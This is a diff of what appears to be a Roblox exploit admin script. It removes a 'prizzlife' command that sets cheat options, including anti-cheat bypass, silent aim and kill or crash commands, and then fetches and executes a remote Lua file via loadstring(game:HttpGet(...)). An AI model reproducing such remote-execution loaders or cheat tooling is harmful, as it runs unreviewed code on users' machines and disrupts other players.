@@ -1,4 +1,4 @@
-if IY_LOADED and not _G.IY_DEBUG == true then
+﻿if IY_LOADED and not _G.IY_DEBUG == true then
     return
 end
 
@@ -13237,58 +13237,6 @@ profile("Inf Yield", function()
         end
 
         Load(Dex)
-    end)
-
-    addcmd("prizzlife", { "pl", "prizz" }, function(args, speaker)
-        notify("Loading", "Hold on a sec")
-        local Diddy_Settings = {
-            -- Prefix & Notifs
-            DefaultPrefix = "diddy",
-            JoinNotify = false,
-
-            -- Respawn & Antis
-            AutoRespawn = false,
-            AntiVoid = true,
-            AntiTase = false,
-            AntiArrest = false,
-            AntiShoot = false,
-            AntiPunch = false,
-            AntiFling = false,
-
-            -- Protection
-            AntiShield = true,
-            AntiBring = false,
-            AntiCheat = true,
-
-            -- Aim & View
-            SilentAim = false,
-            AutoGuns = false,
-            OldItemMethod = false,
-            Fullbright = true,
-
-            -- Ranking
-            WhisperToRanked = true,
-            WhitelistRanked = false,
-            RankedNukeCmds = false,
-            RankedMultiCmd = false,
-            RankedOutput = true,
-            RankedKillCmds = false,
-            RankedLoopCmds = false,
-            RankedTaseCmds = false,
-            RankedArrestCmds = false,
-            RankedNukeCmds = false,
-            RankedFlingCmds = false,
-            RankedAuraCmds = false,
-            RankedTPCmds = true,
-            RankedTrapCmds = true,
-            RankedCarSpawnCmds = true,
-            RankedOpendoorsCmds = true,
-            RankedAllowPowers = true,
-            RankedGivePowers = false,
-            RankedCrashCmds = false,
-            RankedGiveCmds = false,
-        }
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/ephemeral8997/RBXScriptLibrary/refs/heads/main/HauntedAlgorithm_FluffyEntropy.ps1.lua"))()
     end)
 
     addcmd("audiologger", { "alogger" }, function(args, speaker)
